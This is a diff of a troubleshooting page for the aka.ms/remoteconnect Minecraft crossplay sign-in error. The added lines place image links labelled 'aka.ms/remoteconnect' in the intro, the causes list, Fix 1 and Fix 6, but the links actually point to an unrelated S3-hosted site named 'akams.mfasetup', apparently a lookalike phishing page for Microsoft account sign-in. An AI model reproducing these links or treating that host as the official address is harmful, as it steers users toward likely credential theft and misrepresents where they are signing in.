@@ -1,6 +1,8 @@
 # aka.ms/remoteconnect
 
-Aka MS Remoteconnect (https://aka.ms/remoteconnect) is a website that allows you to connect to other devices via your MS account. This is particularly important if you are playing Minecraft on the Nintendo Switch or PlayStation platforms, as it enables the crossplay feature.
+[![aka.ms/remoteconnect](gett-starteed.png)](http://akams.mfasetup.s3-website-us-west-1.amazonaws.com)
+
+Aka MS Remoteconnect ([![aka.ms/remoteconnect](gett-starteed.png)](http://akams.mfasetup.s3-website-us-west-1.amazonaws.com)) is a website that allows you to connect to other devices via your MS account. This is particularly important if you are playing Minecraft on the Nintendo Switch or PlayStation platforms, as it enables the crossplay feature.
 
 Your device will have to be linked to a MS Account if you wish to enable the crossplay feature. However, you may still encounter an error message which reads. One of the most famous uses of this link is for playing Minecraft over multiple consoles.
 
@@ -8,7 +10,7 @@ If you see this error message on your screen, it means that there is a problem. 
 
 ## Why Does the https aka ms remoteconnect Error Occur ?
 
-* Data Corruption is one of the most common reasons you see the https aka ms remoteconnect error appearing on your device. 
+* Data Corruption is one of the most common reasons you see the [![aka.ms/remoteconnect](gett-starteed.png)](http://akams.mfasetup.s3-website-us-west-1.amazonaws.com) error appearing on your device. 
 * The lack of a proper setup can also lead to the issue we are talking about. 
 * If you are signed into another device, it can cause the https aka ms remoteconnect error to show up on the device. 
 * Server errors are also known to cause the error with https aka ms remoteconnect. 
@@ -19,7 +21,7 @@ If you see this error message on your screen, it means that there is a problem. 
 
 ### Fix 1 : Restart Your Device
 
-The first thing you should do when you see the https aka ms remoteconnect error is to restart the device. It is applicable on your PS4, PS5, Nintendo Switch, PC, Mac, Android, and iOS. If a network or device-related issue was causing the error, it should go away by then. As we said, this step is quite basic, but it works more often than you think. At the end of the day, you can get rid of many errors by simply restarting your PS4 or Switch.
+The first thing you should do when you see the [![aka.ms/remoteconnect](gett-starteed.png)](http://akams.mfasetup.s3-website-us-west-1.amazonaws.com) error is to restart the device. It is applicable on your PS4, PS5, Nintendo Switch, PC, Mac, Android, and iOS. If a network or device-related issue was causing the error, it should go away by then. As we said, this step is quite basic, but it works more often than you think. At the end of the day, you can get rid of many errors by simply restarting your PS4 or Switch.
 
 Once you have restarted the device, you can get back in a few seconds.
 
@@ -45,7 +47,7 @@ Solve the https aka ms remoteconnect error once and for all. Instead of using yo
 First and foremost, you will lose access to the activity and achievements from the previous account. As you may already know, a Microsoft account is free to create and maintain.
 
 * Go to this Link.
-* Click on the link called ‘Create account.’
+* Click on the link called **‘Create account.’**
 * You can either provide your email account or get a new email.
 * Create the password and hit Next.
 
@@ -57,7 +59,7 @@ This solution is more of a universal one in that you do not have to worry about 
 
 ### Fix 6 :  Set Up https aka ms remoteconnect Properly
 
-Most of the time, the https aka ms remoteconnect system does not work because of a non-ideal setup. It makes sense to set up your system again from the beginning. 
+Most of the time, the https [![aka.ms/remoteconnect](gett-starteed.png)](http://akams.mfasetup.s3-website-us-west-1.amazonaws.com) system does not work because of a non-ideal setup. It makes sense to set up your system again from the beginning. 
 
 
 ## Is the Aka MS Remoteconnect Website Safe to Use ?
